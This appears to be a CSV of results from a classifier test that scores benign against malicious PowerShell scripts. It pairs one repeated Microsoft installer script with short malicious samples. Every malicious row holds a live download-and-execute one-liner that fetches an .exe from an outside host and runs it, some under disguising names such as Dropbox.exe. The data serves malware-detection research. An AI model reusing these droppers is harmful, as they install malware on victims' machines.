filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,correct,predicted_label,logit_diff
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",8,benign,DownloadFile,True,benign,-1.453125
1515.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.45.193.17/update.exe',""$env:TEMP\updatex86.exe"");Start-Process (""$env:TEMP\updatex86.exe"")",8,malicious,DownloadFile,True,malicious,6.453125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",9,benign,DownloadFile,True,benign,-1.453125
1839.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")",9,malicious,DownloadFile,True,malicious,5.8125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",10,benign,DownloadFile,True,benign,-1.453125
1931.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")",10,malicious,DownloadFile,True,malicious,5.8125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",11,benign,DownloadFile,True,benign,-1.453125
3671.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")",11,malicious,DownloadFile,True,malicious,5.8125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",12,benign,DownloadFile,True,benign,-1.453125
2227.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,147,147,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.28/update.exe',""$env:TEMP\file2x86.exe"");Start-Process (""$env:TEMP\file2x86.exe"")",12,malicious,DownloadFile,True,malicious,6.90625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",13,benign,DownloadFile,True,benign,-1.453125
3545.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,146,146,False,"(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/spe/spendy.exe',""$env:TEMP\spendy.exe"");Start-Process (""$env:TEMP\spendy.exe"")",13,malicious,DownloadFile,True,malicious,4.40625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",14,benign,DownloadFile,True,benign,-1.453125
1946.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,144,144,False,"(New-Object System.Net.WebClient).DownloadFile('http://www.telemedia.co.za/wp-content/ozone/slim.exe','fleeble.exe');Start-Process 'fleeble.exe'",14,malicious,DownloadFile,True,malicious,5.5
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",15,benign,DownloadFile,True,benign,-1.453125
3426.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,143,143,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',""$env:TEMP\Dropbox.exe"");Start-Process (""$env:TEMP\Dropbox.exe"")",15,malicious,DownloadFile,True,malicious,1.75
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",16,benign,DownloadFile,True,benign,-1.453125
1693.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/xsakpo.exe',""$env:TEMP\euioko.exe"");Start-Process (""$env:TEMP\euioko.exe"")",16,malicious,DownloadFile,True,malicious,7.484375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",17,benign,DownloadFile,True,benign,-1.453125
179.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/i1/iz_001.exe',""$env:TEMP\iz_001.exe"");Start-Process (""$env:TEMP\iz_001.exe"")",17,malicious,DownloadFile,True,malicious,5.9375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",18,benign,DownloadFile,True,benign,-1.453125
2294.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/hsmqrh.exe',""$env:TEMP\winreg.exe"");Start-Process (""$env:TEMP\winreg.exe"")",18,malicious,DownloadFile,True,malicious,5.3125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",19,benign,DownloadFile,True,benign,-1.453125
2713.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/b1/bo_001.exe',""$env:TEMP\bo_001.exe"");Start-Process (""$env:TEMP\bo_001.exe"")",19,malicious,DownloadFile,True,malicious,3.34375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",20,benign,DownloadFile,True,benign,-1.453125
2920.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")",20,malicious,DownloadFile,True,malicious,2.46875
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",21,benign,DownloadFile,True,benign,-1.453125
